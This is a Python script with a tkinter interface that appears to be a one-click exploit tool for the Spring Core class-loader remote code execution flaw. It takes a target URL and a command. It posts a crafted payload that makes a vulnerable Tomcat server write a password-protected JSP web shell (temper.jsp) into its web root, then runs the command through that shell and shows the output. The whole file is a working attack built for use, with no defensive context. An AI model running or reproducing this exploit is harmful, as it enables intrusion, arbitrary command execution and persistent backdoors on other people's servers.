# !/usr/bin/python
# -*- coding:utf-8 -*-
# name: huayang
# time: 2022.3.31

import requests
import tkinter
import time
from tkinter import *
from tkinter import ttk
from tkinter import scrolledtext

window = Tk()

ttk.Style().configure(".", font=("仿宋", 15))

window.title('spring-core-rce@huayang(数据里有话)')

window.geometry("714x698")

window.wm_resizable(False,False)


tabControl = ttk.Notebook(window)  

tabControl.pack(expand=1, fill="both")  

#------------------------------
w = tkinter.Label(text="地址:",font=("楷体", 15))
w.place(x=5, y=20)
scr1 = scrolledtext.ScrolledText(width=70, height=3, font=(1))
scr1.place(x=70, y=10)  
w = tkinter.Label(text="命令:",font=("楷体", 15))
w.place(x=5, y=115)
scr2 = scrolledtext.ScrolledText(width=48, height=3, font=(1))
scr2.place(x=70, y=100)  
button = Button(text="利用", width=9, height=3)  
button.place(x=495, y=100)  

w = tkinter.Label(text="执行结果:",font=("楷体", 20))
w.place(x=280, y=175)
scr3 = scrolledtext.ScrolledText(width=85, height=29, font=(1))
scr3.place(x=5, y=220) 
scr3.insert(END, '第一次利用因逻辑问题要等个几秒点击第二下才有结果哦o(*≧▽≦)ツ')

def empty():  
    scr1.delete('0.0', 'end')
    scr2.delete('0.0', 'end')
    scr3.delete('0.0', 'end')

button = Button(text="一键清空", width=9, height=3, command=empty)
button.place(x=590, y=100)

def utilize():

    txt = scr1.get('0.0', 'end')
    strip1 = txt.strip('\n')
    txt = scr2.get('0.0', 'end')
    strip2 = txt.strip('\n')

    def Exploit(url):
        headers = {"suffix": "%>//",
                   "c1": "Runtime",
                   "c2": "<%",
                   "DNT": "1",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "say": "5qC45b+D5Luj56CB5Y6f5L2c6ICF5pivaGVsbG9leHAo5Zug5LiN5Y+v5o6n5Zug57Sg5LuW5bey57uPZ2l0aHVi5LiK5raI5aSx5LqGKe+8jOacrOS6uuWPquaYr+eugOaUueS4gOS4i+W5tuWll+Wxguearizku4XmraTor4HmmI7ku5blrZjlnKjov4c="
                   }
        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=temper&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

        requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
    Exploit(strip1)
    response = requests.get(strip1 + '/temper.jsp?pwd=j&cmd=' + strip2)
    str = response.text
    string = str.split('//')[0]

    scr3.insert(END, string)

    scr3.insert(END, '\n')  


button = Button(text="利用", width=9, height=3,command=utilize)  
button.place(x=495, y=100)  

window.mainloop()